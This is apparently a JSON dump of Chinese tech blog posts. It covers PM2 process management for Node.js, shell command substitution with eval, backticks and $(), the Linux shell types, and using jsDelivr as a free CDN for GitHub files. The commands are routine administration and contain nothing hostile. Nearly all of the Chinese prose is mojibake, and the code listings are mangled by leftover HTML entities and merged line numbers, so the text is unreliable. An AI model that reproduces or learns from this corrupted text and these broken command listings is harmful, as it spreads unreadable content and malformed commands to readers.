åº”ç”¨ç¨‹åºçš„è„šæœ¬ç±»å‹ï¼Œé»˜è®¤æ˜¯node exec_mode string fork åº”ç”¨å¯åŠ¨æ¨¡å¼ï¼Œæ”¯æŒforkå’Œclusteræ¨¡å¼ï¼Œé»˜è®¤ä¸ºfork autorestart boolean true åº”ç”¨ç¨‹åºå´©æºƒæˆ–é€€å‡ºæ—¶è‡ªåŠ¨é‡å¯ æœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ âš ï¸ï¼š å¦‚æœprocesses.jsonæˆ–è€…ecosystem.config.js é…ç½®æ–‡ä»¶å¦‚æœå‘ç”Ÿäº†å˜åŒ–ï¼Œå»ºè®®ç›´æ¥åˆ é™¤åº”ç”¨ä¹‹åï¼Œé‡æ–°åˆ›å»ºï¼Œå¦åˆ™å¯èƒ½éƒ¨åˆ†é…ç½®ä¸ä¼šç”Ÿæ•ˆã€‚ cwd ä¸è¦å¡«ç»å¯¹è·¯å¾„ï¼Œå»ºè®®ç”¨ç›¸å¯¹è·¯å¾„ï¼Œ./è¡¨ç¤ºç›¸å¯¹äºé…ç½®æ–‡ä»¶æ ¹ç›®å½•ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°é™æ€èµ„æºä¸¢å¤±çš„æƒ…å†µã€‚ è¿›ç¨‹ç›‘æ§åˆ—å‡ºæ‰€æœ‰èŠ‚ç‚¹åº”ç”¨ç¨‹åºï¼ˆè¿›ç¨‹/å¾®æœåŠ¡ï¼‰ 12$ pm2 list$ pm2 ls å¯ä»¥å°†è¿›ç¨‹åˆ—è¡¨ä»¥JSONæ ¼å¼æ‰“å°å‡ºæ¥ï¼š 12$ pm2 jlist$ pm2 prettylist ä½¿ç”¨è¿›ç¨‹IDæˆ–åç§°æŸ¥çœ‹æ‰€ç¤ºçš„å•ä¸ªNodeè¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼š 12$ pm2 describe &lt;id | app_name&gt;$ pm2 show &lt;id | app_name&gt; å®æ—¶ç›‘æ§æ‰€æœ‰è¿›ç¨‹CPUæˆ–å†…å­˜ä½¿ç”¨æƒ…å†µï¼š 1$ pm2 monit æ—¥å¿—ç®¡ç†æŸ¥çœ‹æŸä¸ªåº”ç”¨çš„æ—¥å¿—ï¼š 1$ pm2 logs [&#39;all&#39; | app_name | app_id ] 1234$ pm2 logs --json # JSON æ ¼å¼è¾“å‡º$ pm2 logs --format # æ ¼å¼åŒ– output$ pm2 flush # æ¸…ç©ºæ‰€æœ‰æ—¥å¿—æ–‡ä»¶$ pm2 reloadLogs # é‡æ–°åŠ è½½æ‰€æœ‰æ—¥å¿—æ–‡ä»¶ å¸¸ç”¨å‘½ä»¤åœæ­¢è¿›ç¨‹ 1$ pm2 stop [&#39;all&#39; | app_name | app_id ] é‡å¯è¿›ç¨‹ 1$ pm2 restart [&#39;all&#39; | app_name | app_id ] 0ç§’åœæœºé‡è½½è¿›ç¨‹ (ç”¨äº NETWORKED è¿›ç¨‹) 1$ pm2 reload all æ€æ­»è¿›ç¨‹ 1$ pm2 delete [&#39;all&#39; | app_name | app_id ] ä½¿ç”¨PM2 è¿è¡Œ npm startnpm run xxxx æ˜¯ nodeå¸¸ç”¨çš„å¯åŠ¨æ–¹å¼ä¹‹ä¸€ï¼Œé‚£ä¹ˆå¦‚ä½•ä½¿ç”¨PM2æ¥å®ç°å¯¹è¯¥æ–¹å¼çš„å¯åŠ¨å‘¢ï¼Ÿ npm runã€npm startç­‰å‘½ä»¤ä¹‹æ‰€ä»¥å¯ä»¥ä½¿ç”¨ï¼Œæ˜¯å› ä¸ºpackage.jsoné…ç½®æ–‡ä»¶ä¸­å¢åŠ äº†å¯¹åº”çš„è„šæœ¬å‘½ä»¤ã€‚ 1234&quot;scripts&quot;: &#123; &quot;start-dev&quot;: &quot;env $(cat .env | xargs) nodemon server&#x2F;index&quot;, &quot;start&quot;: &quot;node server&#x2F;index&quot;, &#125; è¯­æ³•ï¼š 1pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt;; å…¶ä¸­ --watchç›‘å¬ä»£ç å˜åŒ–ï¼Œ--nameé‡å‘½åä»»åŠ¡åç§°ï¼Œ-- runåé¢è·Ÿè„šæœ¬åå­— å®ä¾‹ï¼š 12&#x2F;&#x2F; ç­‰æ•ˆäº npm startpm2 start npm --watch --name webserver -- run start ç¨³å®šè¿è¡ŒPM2 æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„ Node è¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œå®ƒæœ‰ç€ä¸°å¯Œçš„ç‰¹æ€§ï¼Œèƒ½å¤Ÿå……åˆ†åˆ©ç”¨å¤šæ ¸CPUä¸”èƒ½å¤Ÿè´Ÿè½½å‡è¡¡ã€èƒ½å¤Ÿå¸®åŠ©åº”ç”¨åœ¨å´©æºƒåã€æŒ‡å®šæ—¶é—´(cluster model)å’Œè¶…å‡ºæœ€å¤§å†…å­˜é™åˆ¶ç­‰æƒ…å†µä¸‹å®ç°è‡ªåŠ¨é‡å¯ã€‚ ä¸ºäº†ä¿è¯èƒ½å¤Ÿç¨³å®šè¿è¡Œï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹å‡ ç‚¹å»ºè®®ï¼š åº”ç”¨è¿›ç¨‹è¿è¡Œæ—¶é—´ä¹…äº†æˆ–è®¸æ€»ä¼šäº§ç”Ÿä¸€äº›æ„æ–™ä¹‹å¤–çš„é—®é¢˜ï¼Œå®šæ—¶é‡å¯å¯ä»¥è§„é¿ä¸€äº›ä¸å¯æµ‹çš„æƒ…å†µï¼› æœ€å¤§å†…å­˜é™åˆ¶ï¼Œæ ¹æ®è§‚å¯Ÿè®¾å®šåˆç†å†…å­˜é™åˆ¶ï¼Œä¿è¯åº”ç”¨å¼‚å¸¸è¿è¡Œï¼› min_uptimeï¼Œmin_uptime æ˜¯åº”ç”¨æ­£å¸¸å¯åŠ¨çš„æœ€å°æŒç»­è¿è¡Œæ—¶é•¿ï¼Œåˆç†è®¾ç½®è®¾ç½®æ­¤èŒƒå›´ï¼Œå¯ä»¥å°†è¶…å‡ºæ—¶é—´åˆ¤å®šä¸ºå¼‚å¸¸å¯åŠ¨ï¼› è®¾å®šå¼‚å¸¸é‡å¯å»¶æ—¶restart_delayï¼Œå¯¹äºå¼‚å¸¸æƒ…å†µå¯¼è‡´åº”ç”¨åœæ­¢ï¼Œè®¾å®šå¼‚å¸¸é‡å¯å»¶è¿Ÿå¯é˜²æ­¢åº”ç”¨åœ¨ä¸å¯æµ‹æƒ…å†µä¸‹ä¸æ–­é‡å¯çš„å¯¼è‡´é‡å¯æ¬¡æ•°è¿‡å¤šç­‰é—®é¢˜ï¼› è®¾ç½®å¼‚å¸¸é‡å¯æ¬¡æ•°ï¼Œå¦‚æœåº”ç”¨ä¸æ–­å¼‚å¸¸é‡å¯ï¼Œå¹¶è¶…è¿‡ä¸€å®šçš„é™åˆ¶æ¬¡æ•°ï¼Œè¯´æ˜æ­¤æ—¶çš„ç¯å¢ƒé•¿æ—¶é—´å¤„äºä¸å¯æ§çŠ¶æ€ï¼ŒæœåŠ¡å™¨å¼‚å¸¸ã€‚æ­¤æ—¶ä¾¿å¯åœæ­¢å°è¯•ï¼Œå‘å‡ºé”™è¯¯è­¦å‘Šé€šçŸ¥ç­‰ã€‚ å‚è€ƒé“¾æ¥ pm2 ä»å…¥é—¨åˆ°ç²¾é€š å¦‚ä½•åœ¨ç”Ÿäº§æœåŠ¡å™¨ä¸Šå®‰è£…PM2è¿è¡ŒNode.jsåº”ç”¨ç¨‹åº PM2 é…ç½®æ–‡ä»¶è¯´æ˜è§£æ PM2 åº”ç”¨é…ç½®æ–‡ä»¶è§£æ PM2 å®ç”¨æ‰‹å†Œ PM2 ç”¨æ³•è¯¦è§£ ä½¿ç”¨pm2 è‡ªåŠ¨éƒ¨ç½²nodeé¡¹ç›® PM2 ä¸­æ–‡æ–‡æ¡£","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Tutorial","slug":"Node/Tutorial","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"Node/Tutorial/è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"},{"name":"PM2","slug":"PM2","permalink":"https://www.0x2beace.com/tags/PM2/"},{"name":"è¿›ç¨‹ç®¡ç†","slug":"è¿›ç¨‹ç®¡ç†","permalink":"https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"}]},{"title":"Linux ä¸­çš„evalã€åå¼•å·ã€$()çš„åŒºåˆ«","slug":"the-difference-between-eval-and-backquotes-in-linux-and","date":"2020-07-11T12:41:10.000Z","updated":"2020-07-11T12:46:46.350Z","comments":true,"path":"the-difference-between-eval-and-backquotes-in-linux-and/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-eval-and-backquotes-in-linux-and/","excerpt":"ä¹‹å‰åœ¨æ­å»º SSH ç¯å¢ƒæ—¶ï¼Œé‡åˆ°äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š ä½¿ç”¨å‘½ä»¤ï¼ševal$(ssh-agent)å»åˆ›å»ºä¸€ä¸ªä»£ç†è¿›ç¨‹ï¼Œä½†æ˜¯ä¼šæç¤ºï¼šNo Such file or directory ã€‚ å°±å¾ˆçº³é—·ï¼Œä¹‹å‰éƒ½ç”¨ç€å¥½å¥½çš„ï¼Œä¸ºä»€ä¹ˆåœ¨æ–°çš„ç¯å¢ƒä¸­å°±ä¸è¡Œäº†ï¼Ÿ åæ¥ï¼Œäº†è§£åˆ°åŸæ¥ä¸€ç›´ä½¿ç”¨çš„ eval$(ssh-agent) ï¼Œå…¶ä¸­çš„$() åŸæ¥åœ¨Linuxä¸­æœ‰ç‰¹æ®Šçš„æ„ä¹‰ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°ä¸“é—¨ç”¨æ¥äº†è§£ eval å’Œ åå¼•å· ä»¥åŠ $()ä¹‹é—´çš„åŒºåˆ«ã€‚ å®ƒä»¬çš„ä½œç”¨éƒ½æ˜¯å‘½ä»¤æ›¿æ¢ã€‚","text":"ä¹‹å‰åœ¨æ­å»º SSH ç¯å¢ƒæ—¶ï¼Œé‡åˆ°äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š ä½¿ç”¨å‘½ä»¤ï¼ševal$(ssh-agent)å»åˆ›å»ºä¸€ä¸ªä»£ç†è¿›ç¨‹ï¼Œä½†æ˜¯ä¼šæç¤ºï¼šNo Such file or directory ã€‚ å°±å¾ˆçº³é—·ï¼Œä¹‹å‰éƒ½ç”¨ç€å¥½å¥½çš„ï¼Œä¸ºä»€ä¹ˆåœ¨æ–°çš„ç¯å¢ƒä¸­å°±ä¸è¡Œäº†ï¼Ÿ åæ¥ï¼Œäº†è§£åˆ°åŸæ¥ä¸€ç›´ä½¿ç”¨çš„ eval$(ssh-agent) ï¼Œå…¶ä¸­çš„$() åŸæ¥åœ¨Linuxä¸­æœ‰ç‰¹æ®Šçš„æ„ä¹‰ã€‚ æ‰€ä»¥è¿™ç¯‡ç¬”è®°ä¸“é—¨ç”¨æ¥äº†è§£ eval å’Œ åå¼•å· ä»¥åŠ $()ä¹‹é—´çš„åŒºåˆ«ã€‚ å®ƒä»¬çš„ä½œç”¨éƒ½æ˜¯å‘½ä»¤æ›¿æ¢ã€‚ åœºæ™¯é‡ç°12345678910$ &#96;ssh-agent&#96;sh.exe&quot;: SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-myYvgp1404&#x2F;agent.1404;: No such file or directory$ eval ssh-agentSSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-zIQZKN6080&#x2F;agent.6080; export SSH_AUTH_SOCK;SSH_AGENT_PID&#x3D;1092; export SSH_AGENT_PID;echo Agent pid 1092;$ eval &#96;ssh-agent&#96;Agent pid 4288 ç›´åˆ°æˆ‘è¾“å…¥ eval ssh-agent æ—¶ï¼Œä¼¼ä¹å°±å¯¹äº†ã€‚ å‘½ä»¤ä»£æ¢è¿™ä¸‰ç§ä¸åŒçš„æ–¹å¼éƒ½æ˜¯shellè„šæœ¬ä¸­çš„å‘½ä»¤ä»£æ¢ã€‚ å‘½ä»¤ä»£æ¢æ˜¯æŒ‡shellèƒ½å¤Ÿå°†ä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å‡ºæ’åœ¨ä¸€ä¸ªå‘½ä»¤è¡Œä¸­ä»»ä½•ä½ç½®ã€‚ evalé¦–å…ˆè¦ä»‹ç»çš„æ˜¯: eval å®ƒçš„ä½œç”¨æ˜¯ï¼šé‡æ–°è¿ç®—æ±‚å‡ºå‚æ•°çš„å†…å®¹ã€‚ è¯¥å‘½ä»¤ä½¿ç”¨äºé‚£äº›ä¸€æ¬¡æ‰«ææ— æ³•å®ç°å…¶åŠŸèƒ½çš„å˜é‡ã€‚è¯¥å‘½ä»¤å¯¹å˜é‡è¿›è¡Œä¸¤æ¬¡æ‰«æã€‚ 1234567891011$ touch test.txt$ vim test.txt &#x2F;&#x2F; å†™å…¥ Hello eval$ var&#x3D;&quot;cat test.txt&quot;&#x2F;&#x2F; æ³¨æ„ï¼šä¸­é—´æ²¡æœ‰ç©ºæ ¼ï¼Œå‰é¢æ²¡æœ‰ç¾å…ƒç¬¦å·ã€‚$ echo $varcat test.txt$ eval $varHello eval åå¼•å·ä¸ $()å®ä¾‹ä¸€ï¼š 12345678910$ DATE1&#x3D;$(date)$ DATE2&#x3D;&#96;date&#96;$ DATE3&#x3D;&#96;eval date&#96;$ echo $DATE12019å¹´01æœˆ23æ—¥ 21:20:36$ echo $DATE22019å¹´01æœˆ23æ—¥ 21:20:36$ echo $DATE32019å¹´01æœˆ23æ—¥ 21:20:36 å®ä¾‹äºŒï¼š 1234$ echo &#96;echo &#39;\\\\&#39;&#96; \\$ echo $(echo &#39;\\\\&#39;)\\\\ æš‚æ—¶æ²¡å¤ªæ˜ç™½è¿™ä¸‰è€…çš„å®é™…åº”ç”¨åœºæ™¯ï¼Œä¸è¿‡äº†è§£åˆ°äº† å®ƒä»¬ä¹‹é—´çš„ä¸€äº›åŒºåˆ«ä¸è”ç³»ã€‚ å‚è€ƒé“¾æ¥ï¼š https://kyle.io/2012/09/ssh-agent-messiness-solving-it/ shellè„šæœ¬ä¸­å‘½ä»¤ä»£æ¢ï¼šåå¼•å·ã€$()ã€evalåŒºåˆ« shellè„šæœ¬ä¸­å‘½ä»¤ä»£æ¢ï¼šåå¼•å·ã€$()ã€evalåŒºåˆ«2","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"Linux ä¸­çš„Shell ç§ç±»","slug":"shell-types-in-linux","date":"2020-07-11T12:36:46.000Z","updated":"2020-07-11T12:41:49.331Z","comments":true,"path":"shell-types-in-linux/","link":"","permalink":"https://www.0x2beace.com/shell-types-in-linux/","excerpt":"ä»€ä¹ˆæ˜¯Shellï¼Ÿ","text":"ä»€ä¹ˆæ˜¯Shellï¼Ÿ Shell æ˜¯ä¸€ä¸ªç¨‹åºï¼Œå…¶ä½œç”¨æ˜¯å°†ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤å‘é€åˆ°OSï¼ˆç³»ç»Ÿå†…æ ¸ï¼‰ã€‚ æ®è¯´å®ƒèµ·æºäºä½œä¸ºå­˜åœ¨äºOS å†…éƒ¨å’Œç”¨æˆ·ä¹‹é—´çš„å¤–å£³çš„ä¾é™„ç€ã€‚æ‰€ä»¥ä¸ºå½¢è±¡çš„ç§°ä½œä¸º å£³ï¼ˆShellï¼‰ã€‚ Shell çš„ç§ç±»Linux Shell çš„ç§ç±»å¾ˆå¤šï¼Œç›®å‰æµè¡Œçš„Shell åŒ…æ‹¬ashã€bashã€kshã€cshã€zshç­‰ï¼Œç§ç±»å¤šäº†ï¼Œä¹Ÿå°±æœ‰äº†æ ‡å‡†åŒ–çš„è¦æ±‚ï¼Œè¿™å°±æ˜¯POSIXçš„ç”±æ¥ã€‚ POSIX è¡¨ç¤ºå¯ç§»æ¤æ“ä½œç³»ç»Ÿæ¥å£ï¼ˆUNIXçš„å¯ç§»æ¤æ“ä½œç³»ç»Ÿæ¥å£ï¼Œç¼©å†™ä¸ºPOSIXï¼‰ï¼ŒPOSIXæ ‡å‡†å®šä¹‰äº†æ“ä½œç³»ç»Ÿåº”è¯¥ä¸ºåº”ç”¨ç¨‹åºæä¾›çš„æ¥å£æ ‡å‡†ã€‚ é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶ä¸­çš„å†…å®¹æ¥æŸ¥çœ‹è‡ªå·±ä¸»æœºä¸­å½“å‰æœ‰å“ªäº›ç§ç±»çš„Shellï¼š 1234567891011121314151617$ cat &#x2F;etc&#x2F;shells&#x2F;bin&#x2F;sh&#x2F;bin&#x2F;bash&#x2F;bin&#x2F;ksh&#x2F;bin&#x2F;pdksh&#x2F;bin&#x2F;tcsh&#x2F;bin&#x2F;zsh&#x2F;bin&#x2F;dash&#x2F;bin&#x2F;posh&#x2F;usr&#x2F;bin&#x2F;sh&#x2F;usr&#x2F;bin&#x2F;bash&#x2F;usr&#x2F;bin&#x2F;ksh&#x2F;usr&#x2F;bin&#x2F;pdksh&#x2F;usr&#x2F;bin&#x2F;tcsh&#x2F;usr&#x2F;bin&#x2F;zsh&#x2F;usr&#x2F;bin&#x2F;dash&#x2F;usr&#x2F;bin&#x2F;posh å¦‚ä½•æŸ¥çœ‹å½“å‰æ­£åœ¨ä½¿ç”¨çš„Shell ç±»å‹ï¼š 12$ echo $SHELL&#x2F;bin&#x2F;bash $SHELLæ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒè®°å½•äº†Linux å½“å‰ç”¨æˆ·æ‰€ä½¿ç”¨çš„Shellç±»å‹ã€‚ ç”¨æˆ·å¯ä»¥é€šè¿‡ç›´æ¥è¾“å…¥å„ç§Shellçš„äºŒè¿›åˆ¶æ–‡ä»¶åï¼ˆå› ä¸ºè¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶æœ¬èº«æ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„ï¼‰ï¼Œæ¥è¿›å…¥åˆ°è¯¥Shellä¸‹ï¼Œæ¯”å¦‚è¿›å…¥zshå¯ä»¥ç›´æ¥è¾“å…¥ï¼š 1$ &#x2F;bin&#x2F;zsh è¿™ä¸ªå‘½ä»¤ä¸ºç”¨æˆ·åˆå¯åŠ¨äº†ä¸€ä¸ªShellï¼Œè¿™ä¸ªShellåœ¨æœ€åˆç™»å½•çš„é‚£ä¸ªShellä¹‹åï¼Œç§°ä¸ºä¸‹çº§çš„Shellæˆ–å­Shellã€‚ æœ€æ ‡å‡†çš„ShellBashshæ˜¯Unix ä¸Šæœ€å¤è€çš„Shellï¼Œåœ¨shçš„åŸºç¡€ä¸Šæ·»åŠ äº†å„ç§æ‰©å±•åŠŸèƒ½çš„æ˜¯bashï¼Œå®ƒæˆä¸ºLinuxæ ‡å‡†Shellã€‚æœ‰å¦‚ä¸‹çš„ç‰¹ç‚¹ï¼š ä½¿ç”¨ä¸Šä¸‹é”®å¿«é€ŸæŸ¥çœ‹å†å²å‘½ä»¤ Tab é”®è‡ªåŠ¨è¡¥å…¨ å…¶ä»–Shellashashæ˜¯Linux ä¸­å ç”¨ç³»ç»Ÿèµ„æºæœ€å°‘çš„ä¸€ä¸ªå°Shellï¼Œå®ƒåªåŒ…å«24ä¸ªå†…éƒ¨å‘½ä»¤ï¼Œå› è€Œä½¿ç”¨èµ·æ¥å¾ˆä¸æ–¹ä¾¿ã€‚ cshcshæ˜¯Linux æ¯”è¾ƒå¤§çš„å†…æ ¸ï¼Œå…±æœ‰52ä¸ªå†…éƒ¨å‘½ä»¤ã€‚è¯¥Shellå…¶å®æ˜¯æŒ‡å‘/bin/tcshè¿™æ ·çš„ä¸€ä¸ªShellï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œcshå…¶å®å°±æ˜¯tcshã€‚ zshzchæ˜¯Linux æœ€å¤§çš„Shellä¹‹ä¸€ï¼Œå…±æœ‰84 ä¸ªå†…éƒ¨å‘½ä»¤ã€‚ zshå…·æœ‰å¦‚ä¸‹ç‰¹æ€§ï¼š æ›´å¥½çš„è‡ªåŠ¨è¡¥å…¨ã€æ›´é«˜æ•ˆ æ›´å¥½çš„æ–‡ä»¶åå±•å¼€ï¼ˆé€šé…ç¬¦å±•å¼€ï¼‰ å¯å®šåˆ¶æ€§é«˜ å‚è€ƒé“¾æ¥ ä»€ä¹ˆæ˜¯Shellä»¥åŠå¸¸è§Shellç§ç±»","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Shell","slug":"Shell","permalink":"https://www.0x2beace.com/tags/Shell/"}]},{"title":"å…è´¹ CDNï¼šJsDelivr + Github","slug":"free-cdn-jsdelivr-github","date":"2020-07-10T05:32:43.000Z","updated":"2020-07-10T05:34:57.891Z","comments":true,"path":"free-cdn-jsdelivr-github/","link":"","permalink":"https://www.0x2beace.com/free-cdn-jsdelivr-github/","excerpt":"ä¸çŸ¥é“å¤§å®¶é€šå¸¸æ˜¯å¦‚ä½•è®¿é—®å›¾åºŠçš„ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´ä½¿ç”¨çš„æ–¹å¼æ˜¯ï¼šGitHub å›¾åºŠ + raw.githubusercontentã€‚ å›¾ç‰‡ç›¸å…³çš„èµ„æºå…¨éƒ¨æ”¾åœ¨GitHubä¸Šï¼Œç„¶åä½¿ç”¨GitHub æä¾›çš„ç´ ææœåŠ¡å™¨raw.githubusercontentå»è®¿é—®ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯æ”¾åœ¨ Github çš„èµ„æºåœ¨å›½å†…åŠ è½½é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œå¦‚æœç½‘ç»œç¨å¾®å·®ä¸€äº›ï¼Œèµ„æºå¯èƒ½å°±ä¼šåŠ è½½å¤±è´¥ã€‚ å› æ­¤éœ€è¦ä½¿ç”¨ CDN æ¥åŠ é€Ÿæ¥ä¼˜åŒ–èµ„æºåŠ è½½é€Ÿåº¦ã€‚","text":"ä¸çŸ¥é“å¤§å®¶é€šå¸¸æ˜¯å¦‚ä½•è®¿é—®å›¾åºŠçš„ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´ä½¿ç”¨çš„æ–¹å¼æ˜¯ï¼šGitHub å›¾åºŠ + raw.githubusercontentã€‚ å›¾ç‰‡ç›¸å…³çš„èµ„æºå…¨éƒ¨æ”¾åœ¨GitHubä¸Šï¼Œç„¶åä½¿ç”¨GitHub æä¾›çš„ç´ ææœåŠ¡å™¨raw.githubusercontentå»è®¿é—®ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯æ”¾åœ¨ Github çš„èµ„æºåœ¨å›½å†…åŠ è½½é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œå¦‚æœç½‘ç»œç¨å¾®å·®ä¸€äº›ï¼Œèµ„æºå¯èƒ½å°±ä¼šåŠ è½½å¤±è´¥ã€‚ å› æ­¤éœ€è¦ä½¿ç”¨ CDN æ¥åŠ é€Ÿæ¥ä¼˜åŒ–èµ„æºåŠ è½½é€Ÿåº¦ã€‚ CDN æ˜¯ä»€ä¹ˆ CDNçš„å…¨ç§°æ˜¯Content Delivery Networkï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œã€‚CDNæ˜¯æ„å»ºåœ¨ç½‘ç»œä¹‹ä¸Šçš„å†…å®¹åˆ†å‘ç½‘ç»œï¼Œä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œé€šè¿‡ä¸­å¿ƒå¹³å°çš„è´Ÿè½½å‡è¡¡ã€å†…å®¹åˆ†å‘ã€è°ƒåº¦ç­‰åŠŸèƒ½æ¨¡å—ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚CDNçš„å…³é”®æŠ€æœ¯ä¸»è¦æœ‰å†…å®¹å­˜å‚¨å’Œåˆ†å‘æŠ€æœ¯ã€‚â€”â€”ç™¾åº¦ç™¾ç§‘ ç”±äºæŸäº›åŸå› ï¼Œå¾ˆå¤šå…¬ç”¨å…è´¹çš„ CDN èµ„æºåœ¨ä¸­å›½å¤§é™†å¹¶ä¸å¾ˆå¥½ç”¨ï¼Œå°±ç®—æ˜¯ä»˜è´¹çš„ï¼Œä¹Ÿæœ‰ä¸€å®šçš„é™åˆ¶ï¼Œä¾‹å¦‚æ¯å¤©çš„åˆ·æ–°æ¬¡æ•°æœ‰é™ä¹‹ç±»çš„ã€‚å¹¸è¿çš„æ˜¯åœ¨ä¸­å›½å¤§é™†å”¯ä¸€æœ‰ license çš„å…¬æœ‰ CDNç«Ÿç„¶æ˜¯å…è´¹çš„ï¼Œå®ƒå°±æ˜¯â€”â€”JsDelivrã€‚ JsDelivr æ˜¯ä»€ä¹ˆ A free CDN for Open Source fast, reliable, and automated. â€”â€” JsDelivr å®˜ç½‘ æ ¹æ®å®˜ç½‘çš„ä»‹ç»æˆ‘ä»¬å¯ä»¥çŸ¥é“å®ƒæ˜¯ä¸€ä¸ªå…è´¹ã€å¿«é€Ÿã€å¯é ã€è‡ªåŠ¨åŒ– çš„CDNã€‚ é‚£ä¹ˆï¼Œè¿™ä¹ˆæ£’çš„CDNï¼Œåˆ°åº•è¯¥å¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿä¸‹é¢ä¼šä¸€ä¸€ä»‹ç»ã€‚ å¿«é€Ÿä¸Šæ‰‹JsDelivr ç›®å‰æœ‰ä¸‰ç§ç”¨æ³•ï¼š \u001fNpm Github Wordpress å› ä¸ºæœ¬æ–‡çš„é‡ç‚¹æ˜¯å¦‚ä½•ä½¿ç”¨ GitHub + JsDelivrï¼Œæ¥æ­å»ºå…è´¹çš„CDNï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸å¯¹å…¶ä»–ä¸¤ç§ç”¨æ³•åšè¿‡å¤šä»‹ç»ã€‚ 1. æ–°å»ºGithub ä»“åº“è¿™ä¸ªä»“åº“æ˜¯ç”¨äºå­˜å‚¨èµ„æºæ–‡ä»¶çš„ï¼Œæœ€å¥½æ˜¯publicï¼Œå› ä¸ºprivateçš„ä»“åº“ï¼Œèµ„æºé“¾æ¥ä¼šå¸¦tokenéªŒè¯ï¼Œè€Œè¿™ä¸ªtokenä¼šå­˜åœ¨è¿‡æœŸçš„é—®é¢˜ã€‚ 2. å°†æœ¬åœ°èµ„æºæ¨é€è‡³ä»“åº“å°†èµ„æºæ–‡ä»¶åŠ å…¥æœ¬åœ°ä»“åº“ï¼Œç„¶åæ¨é€è‡³ CDN çš„è¿œç¨‹ä»“åº“ã€‚ 3. å‘å¸ƒä»“åº“å¦‚æœæ²¡æœ‰å‘å¸ƒå°±ç›´æ¥ä½¿ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ–‡ä»¶åŠ è½½å¼‚å¸¸ã€‚ è‡ªå®šä¹‰å‘å¸ƒç‰ˆæœ¬å·ï¼š ç„¶åç‚¹å‡»Publish releaseã€‚ 4. é€šè¿‡jsDeliverå¼•ç”¨èµ„æºåªéœ€è¦é€šè¿‡ç¬¦åˆ JSDelivr è§„åˆ™çš„ URL å¼•ç”¨ï¼Œå³å¯ç›´æ¥ä½¿ç”¨ Github ä¸­çš„èµ„æºã€‚ è§„åˆ™å¦‚ä¸‹ï¼š 1https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;username&#x2F;repository@version&#x2F;file å‚æ•°è¯´æ˜ï¼š cdn.jsdelivr.net/gh/ï¼šjsDeliver è§„å®šGithub çš„å¼•ç”¨åœ°å€ usernameï¼šä½ çš„GitHub ç”¨æˆ·å repositoryï¼šCDN ä»“åº“ @versionï¼šå‘å¸ƒçš„ç‰ˆæœ¬å· fileï¼šèµ„æºæ–‡ä»¶åœ¨ä»“åº“ä¸­çš„è·¯å¾„ 